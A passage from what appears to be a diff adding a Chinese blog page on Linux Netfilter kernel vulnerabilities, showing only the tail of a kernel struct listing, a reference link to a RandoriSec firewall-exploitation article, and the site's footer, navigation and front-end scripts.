class="title">phase</span>:</span><span class="number">8</span>;	<span class="comment">/* The phase the context is in */</span></span><br><span class="line">	<span class="type">bool</span>			need_free:<span class="number">1</span>;	<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line">	<span class="type">bool</span>			global:<span class="number">1</span>;	<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://blog.randorisec.fr/fr/crack-linux-firewall/">https://blog.randorisec.fr/fr/crack-linux-firewall/</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://jamorant12138.github.io/2024/Dig%20into%20Netfilter%20(4)/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Netfilter/" rel="tag">Netfilter</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2024/Dig%20into%20Netfilter%20(3)/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">Dig into Netfilter (三) —— CVE-2022-1972 / CVE-2022-2078</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> 翰青HanQi
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="北极落小雪"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2022/About">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+<!-- ClickLove -->
+ 
+<script src="/js/clickLove.js"></script>
+ 
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+
+</html>
